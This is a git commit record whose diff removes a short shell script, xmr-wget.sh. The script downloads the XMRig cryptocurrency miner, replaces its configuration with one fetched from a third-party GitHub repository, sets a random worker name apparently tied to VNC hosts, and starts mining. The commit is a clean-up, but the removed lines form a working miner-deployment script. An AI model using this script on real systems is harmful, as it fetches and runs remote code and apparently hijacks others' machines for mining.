7b1c958e10624d04aa521683c2a756d9028c3035
tr1fled <124415108+tr1fled@users.noreply.github.com>
2024-09-30 17:59:53 -0600

    Remove Skidded Code 😁😁😁😏😏

--- xmr-wget.sh
+++
@@ -1,9 +0,0 @@
-#!/bin/bash
-wget https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz &&
-tar -xf xmrig-6.21.3-linux-static-x64.tar.gz &&
-cd xmrig-6.21.3 &&
-rm -rf config.json &&
-wget https://raw.githubusercontent.com/spetterman66/verynicerepo/main/config.json &&
-randnum=$(( RANDOM % 1000 + 1 ))
-sed -i "s/17lifers@home/17lifers-vnc-$randnum/g" config.json &&
-./xmrig
